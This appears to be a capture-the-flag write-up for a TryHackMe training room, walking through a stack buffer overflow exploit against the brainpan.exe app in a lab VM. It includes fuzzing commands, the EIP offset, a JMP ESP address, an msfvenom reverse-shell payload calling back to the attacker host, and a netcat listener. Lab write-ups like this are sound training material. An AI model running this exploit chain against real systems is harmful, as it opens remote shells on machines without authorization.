# brainpan.exe - Buffer Overflow Prep - TryHackMe

Writeup for the **brainpan.exe** app available in the [Buffer Overflow Prep](https://tryhackme.com/room/bufferoverflowprep) room from [TryHackMe](https://tryhackme.com/).

Steps for exploiting the **brainpan.exe** application:
1. Know your app
2. Fuzz
3. Find EIP offset
4. Test for bad chars
5. Exploit!

## Set up

* Attacker: Kali Linux, IP 192.179.80.177
* Target: Windows 7 VM, IP 192.168.90.136
  * [Immunity Debugger](https://www.immunityinc.com/products/debugger/)
  * [mona.py](https://github.com/corelan/mona)

## 1. Know your app

Interact with the app and take note of the expected input.
```
nc -nv 192.168.90.136
```


...



## 2. Fuzz

Fuzz the application to test for buffer overflow. You can use [SPIKE](https://resources.infosecinstitute.com/topic/intro-to-fuzzing/) (generic_send_tcp), a tool already available at most Kali Linux installs, or your own script.

In this case, I used a somewhat generic script I created for fuzzing TCP applications: [sock-stream-fuzz.py](https://github.com/isabellecda/cyber-scripts/tree/main/buffer-overflow). Please feel free to use it and/or contribute to it.

Run the application in Immunity Debugger and execute the fuzzer:
```
./sock-stream-fuzz.py --rhost=192.168.90.136 --rport=9999 -f --buffstep=200
```


Application crashed with 600 bytes!

We can see in the debugger that the EIP registry was overwriten:



Testing the application with a buffer head, we can see that we were also able to write to memory positions pointed by EDX and ESP. 
```
./ig-buffer-overflow.py -m test --rhost=192.168.90.136 --rport=9999 --buffsize=1000 --buffhead='HELLO '
```



## 3. Find EIP offset

To find the EIP offset, send a cyclic pattern to the application (the value writen in EIP will be checked against the pattern and the offset will be found).

For this and the next steps I will be using a custom script I created: [ig-buffer-overflow.py](https://github.com/isabellecda/cyber-scripts/tree/main/buffer-overflow). Please feel free to use it and/or contribute to it.

Re-run the application in the debugger and send the cyclic string:
```
./ig-buffer-overflow.py -m cyclic --rhost=192.168.90.136 --rport=9999 --buffsize=600 --buffhead=''
```



Check offset:
```
./ig-buffer-overflow.py -m checkoffset --value=35724134 --length=600
Offset for length 600: 524
```

## 4. Test for bad chars

Write bad chars to found memory position to find out which chars we have to exclude from our exploit:
```
./ig-buffer-overflow.py -m write --rhost=192.168.90.136 --rport=9999 --buffsize=600 --buffhead='' --offset=524 --hexcontent=BBBBBBBB --before=badchar --exclude=00 --nopsb=2
```



!mona config -set workingfolder c:\temp

!mona bytearray

!mona compare -f c:\monalogs\brainpan_2164\bytearray.bin -a 005FF80B



## 5. Find JMP instruction

!mona jmp -n -r ESP



JMP ESP address = 0x311712f3

Set breakpoint at 0x311712f3 and test it writing even more bytes to the application (the following command also adds some nops before and after write content):

./ig-buffer-overflow.py -m write --rhost=192.168.90.136 --rport=9999 --buffsize=1200 --buffhead='' --offset=524 --hexcontent=l311712f3 --after=BBBB --nopsa=4 --before=CCCC --nopsb=10



## 6. Exploit!

Generate shellcode:
```
msfvenom -p windows/shell_reverse_tcp -b "\x00" LHOST=192.168.80.177 LPORT=443 -f hex EXITFUNC=thread -o reverse
```

Set up handler:
```
sudo rlwrap -a nc -lvnp 443
```

Exploit:
```
./ig-buffer-overflow.py -m write --rhost=192.168.90.136 --rport=9999 --buffsize=1200 --buffhead='' --offset=524 --hexcontent=l311712f3 --after=shellcode --nopsa=10 --shellcode=reverse2


```

Got the shell!!





THE END!
